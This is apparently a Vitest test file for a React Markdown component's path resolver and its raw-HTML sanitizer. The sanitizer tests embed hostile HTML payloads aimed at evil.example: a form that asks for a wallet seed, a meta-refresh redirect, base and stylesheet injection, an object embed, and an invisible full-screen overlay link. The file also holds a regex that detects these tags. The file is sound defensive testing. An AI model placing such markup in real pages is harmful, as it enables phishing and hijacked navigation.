import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import Markdown, { resolvePath } from "../../../src/components/utils/Markdown";

const render = (markdown: string) =>
  renderToStaticMarkup(createElement(Markdown, { children: markdown }));

const BASE = "https://ipfs.filebase.io/ipfs/bafyabc123";

describe("resolvePath", () => {
  it("resolves a relative path against the document's directory", () => {
    expect(resolvePath("images/logo.png", BASE)).toBe(
      `${BASE}/images/logo.png`,
    );
    expect(resolvePath("./shots/1.png", `${BASE}/`)).toBe(
      `${BASE}/shots/1.png`,
    );
  });

  it("leaves URLs, anchors and paths without a base alone", () => {
    for (const path of [
      "https://example.com/a.png",
      "blob:https://app/1",
      "#install",
      "//cdn.example/a.png",
    ]) {
      expect(resolvePath(path, BASE)).toBe(path);
    }
    expect(resolvePath("images/logo.png", undefined)).toBe("images/logo.png");
  });
});

describe("raw HTML in Markdown", () => {
  it("keeps formatting, without styles, classes, ids or pings", () => {
    const html = render(
      '<p align="center" style="position:fixed" class="fixed inset-0" id="support-button">Hi</p>\n\n' +
        '<a href="https://tansu.dev" ping="https://track.example">site</a>',
    );
    expect(html).toContain('<p align="center">Hi</p>');
    expect(html).not.toMatch(/style=|class="fixed|id=|ping=/);
    expect(html).toContain('href="https://tansu.dev"');
  });

  it("drops what is not formatting", () => {
    const html = render(
      '<form action="https://evil.example"><input name="seed"></form>',
    );
    expect(html).not.toMatch(/<form|<input/);
  });
});

describe("an image written as a block", () => {
  it("renders instead of throwing, whatever it holds", () => {
    for (const markdown of [
      "<img>\n\nx\n\n</img>",
      "<img src=x>\n\n**x**\n\n</img>",
      "- a\n\n<img>\n\nb\n\n</img>",
    ]) {
      expect(() => render(markdown)).not.toThrow();
    }
    expect(render("<img>\n\nx\n\n</img>")).toContain("<img");
  });
});

const FORBIDDEN =
  /<form|<input|<button|<meta|<base|<link|<object|style=|id=|class="fixed/;

describe("raw HTML the library does not hand to the allowlist", () => {
  const EVIL = "https://evil.example";
  const payloads: Record<string, string> = {
    form: `<form action="${EVIL}"><input name="seed"><button>Sign</button></form>`,
    head: `<meta http-equiv="refresh" content="0;url=${EVIL}"><base href="${EVIL}/"><link rel="stylesheet" href="${EVIL}/x.css">`,
    object: `<object data="${EVIL}/page.html"></object>`,
    overlay: `<b></b><a href="${EVIL}" style="position:fixed;inset:0;opacity:0" id="support-button" class="fixed inset-0">x</a>`,
  };

  for (const [name, html] of Object.entries(payloads)) {
    it(`drops ${name} written inside <pre>`, () => {
      expect(render(`<pre>${html}</pre>`)).not.toMatch(FORBIDDEN);
    });
  }

  for (const tag of ["details", "div", "p", "blockquote"]) {
    it(`drops a form inside a <${tag}> that holds a <pre>`, () => {
      const out = render(
        `<${tag}><pre>x</pre>${payloads.form}</${tag}>\n\nafter`,
      );
      expect(out).not.toMatch(FORBIDDEN);
      expect(out).toContain("after");
    });
  }

  it("drops it inside a table cell and a list item", () => {
    expect(
      render(
        `<table><tbody><tr><td><pre>x</pre>${payloads.form}</td></tr></tbody></table>`,
      ),
    ).not.toMatch(FORBIDDEN);
    expect(render(`- item\n\n  <pre>${payloads.form}</pre>`)).not.toMatch(
      FORBIDDEN,
    );
  });

  it("keeps the rest of the page and ordinary content", () => {
    const html = render(
      [
        "## Rationale",
        "",
        "We should fund this.",
        "",
        `<pre>${payloads.form}</pre>`,
        "",
        "```",
        "plain fenced code",
        "```",
        "",
        "| a | b |",
        "|---|---|",
        "| 1 | 2 |",
        "",
        "<details><summary>More</summary>\n\ntext\n\n</details>",
      ].join("\n"),
    );
    expect(html).toMatch(/<h2[^>]*>Rationale<\/h2>/);
    expect(html).toContain("We should fund this.");
    expect(html).toContain("<pre><code>plain fenced code</code></pre>");
    expect(html).toContain("<td");
    expect(html).toContain("<summary>More</summary>");
    expect(html).not.toMatch(/<form|<input|<button/);
  });
});
